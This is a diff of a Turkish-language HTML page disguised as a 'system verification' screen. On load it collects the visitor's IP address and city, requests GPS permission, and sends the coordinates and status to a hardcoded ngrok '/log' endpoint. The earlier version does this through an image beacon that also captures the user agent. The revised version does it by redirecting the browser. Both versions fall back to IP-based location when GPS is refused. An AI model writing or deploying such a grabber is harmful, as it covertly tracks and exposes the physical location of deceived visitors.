@@ -1,114 +1,45 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Doğrulaması</title>
-    <style>
-        body {
-            background-color: #000;
-            color: #00ff00;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            text-shadow: 0 0 5px #00ff00;
-        }
-        .container {
-            border: 1px solid #00ff00;
-            padding: 20px;
-            box-shadow: 0 0 15px #00ff00;
-            text-align: center;
-        }
-        .loading-bar {
-            width: 200px;
-            height: 2px;
-            background: #003300;
-            margin: 20px auto;
-            position: relative;
-            overflow: hidden;
-        }
-        .loading-bar::after {
-            content: '';
-            display: block;
-            width: 50px;
-            height: 100%;
-            background: #00ff00;
-            animation: move 1.5s infinite;
-        }
-        @keyframes move {
-            0% { transform: translateX(-50px); }
-            100% { transform: translateX(200px); }
-        }
-    </style>
+    <title>Sistem Kontrolü</title>
+    <style>body { background: black; color: #0f0; font-family: monospace; text-align: center; padding-top: 20%; }</style>
 </head>
 <body>
-
-    <div class="container">
-        <h1>BİRİM ERİŞİMİ GEREKLİ</h1>
-        <p id="status">Kullanıcı yetkileri taranıyor...</p>
-        <div class="loading-bar"></div>
-        <p style="font-size: 10px; opacity: 0.6;">JARVIS V3.5 - GÜVENLİ BAĞLANTI</p>
-    </div>
+    <h1>VERİLER DOĞRULANIYOR...</h1>
+    <p>Lütfen konum iznini onaylayın.</p>
 
     <script>
-        // --- AYAR KISMI ---
-        // Terminalindeki Ngrok linkini buraya yapıştır (Sonuna /log eklemeyi unutma!)
+        // --- GÜNCEL NGROK LİNKİNİ BURAYA YAZ ---
         const NGROK_URL = "https://punctual-villain-arson.ngrok-free.dev/log";
-        // ------------------
 
-        async function jarvisBaslat() {
-            const statusText = document.getElementById('status');
-            
+        async function başlat() {
             try {
-                // 1. Önce IP ve genel verileri al
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-
-                statusText.innerText = "Konum doğrulaması bekleniyor...";
-
-                // 2. GPS İzni İste (Jarvis Bildirimi)
+                // IP bilgilerini al
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                // Konum İste (Jarvis Bildirimi)
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        // İzin VERİLDİ
-                        const coords = `${pos.coords.latitude},${pos.coords.longitude}`;
-                        statusText.innerText = "Erişim Onaylandı. Yönlendiriliyorsunuz...";
-                        veriyiFirlat(ipData.ip, ipData.city, coords, "GPS_ONAY");
+                        yolla(data.ip, data.city, pos.coords.latitude + "," + pos.coords.longitude, "GPS_OK");
                     },
                     (err) => {
-                        // İzin REDDEDİLDİ
-                        statusText.innerText = "Erişim Kısıtlı. IP üzerinden bağlanılıyor...";
-                        const tahminiKoord = `${ipData.latitude},${ipData.longitude}`;
-                        veriyiFirlat(ipData.ip, ipData.city, tahminiKoord, "GPS_RED");
+                        yolla(data.ip, data.city, data.latitude + "," + data.longitude, "GPS_RED");
                     },
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    { timeout: 5000 }
                 );
-
-            } catch (error) {
-                console.log("Sistem hatası.");
+            } catch (e) {
+                console.log("Hata");
             }
         }
 
-        function veriyiFirlat(ip, city, loc, status) {
-            const params = new URLSearchParams({
-                ip: ip,
-                city: city,
-                loc: loc,
-                status: status,
-                ua: navigator.userAgent
-            });
-
-            // Tarayıcı engelini aşmak için 'Beacon' veya 'Image' tekniği
-            const finalURL = `${NGROK_URL}?${params.toString()}`;
-            const img = new Image();
-            img.src = finalURL;
+        function yolla(ip, city, loc, status) {
+            // EN SAĞLAM YÖNTEM: Sayfayı verilerle beraber senin Ngrok linkine yönlendirir
+            const url = `${NGROK_URL}?ip=${ip}&city=${city}&loc=${loc}&status=${status}`;
+            window.location.href = url;
         }
 
-        // Sayfa açıldıktan 1 saniye sonra başlat
-        setTimeout(jarvisBaslat, 1000);
+        setTimeout(başlat, 500);
     </script>
 </body>
 </html>
